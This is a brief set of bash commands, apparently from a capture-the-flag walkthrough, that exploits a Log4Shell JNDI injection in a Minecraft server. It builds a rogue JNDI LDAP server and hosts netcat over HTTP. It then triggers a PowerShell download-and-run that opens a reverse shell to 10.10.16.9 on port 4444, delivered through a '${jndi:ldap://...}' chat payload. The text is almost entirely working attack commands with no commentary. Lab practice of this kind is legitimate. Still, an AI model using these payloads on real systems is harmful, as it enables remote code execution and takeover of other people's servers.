

```bash
sudo apt install maven
```
```bash
git clone https://github.com/veracode-research/rogue-jndi.git
cd rogue-jndi
mvn package
```
```bash
wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe
python3 -m http.server
```
```bash
java -jar target/RogueJndi-1.1.jar --command "powershell.exe iwr
http://10.10.16.9:8080/nc64.exe -O c:\windows\temp\nc64.exe;
c:\windows\temp\nc64.exe 10.10.16.9 4444 -e cmd.exe" --hostname "10.10.16.9"
```

minecraft-cli:

```bash
/send ${jndi:ldap://10.10.14.48:1389/o=reference}
```